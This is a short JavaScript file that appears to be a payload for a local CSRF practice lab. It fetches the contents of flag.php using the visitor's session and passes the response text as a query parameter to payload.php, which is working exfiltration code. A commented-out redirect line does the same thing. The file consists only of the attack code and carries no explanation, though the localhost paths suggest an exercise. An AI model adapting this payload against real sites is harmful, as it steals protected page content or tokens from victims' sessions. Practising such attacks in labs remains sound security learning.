var xhr = new XMLHttpRequest();
// var text="";
xhr.open("GET","http://localhost/csrf/practice1/flag.php");
xhr.onreadystatechange = CallbackFun;
xhr.send();
function CallbackFun(){
    if (xhr.readyState==4 && xhr.status==200){
        window.text = xhr.responseText;
        // alert(text);
        submit(text);
    }
}
function submit(text){
    var xhr2 = new XMLHttpRequest();
    xhr2.open("GET","http://localhost/csrf/practice1/payload.php?c="+text);
    xhr2.onreadystatechange=undefined;
    xhr2.send();
}

// window.location.href="http://localhost/csrf/practice1/payload.php?c="+text;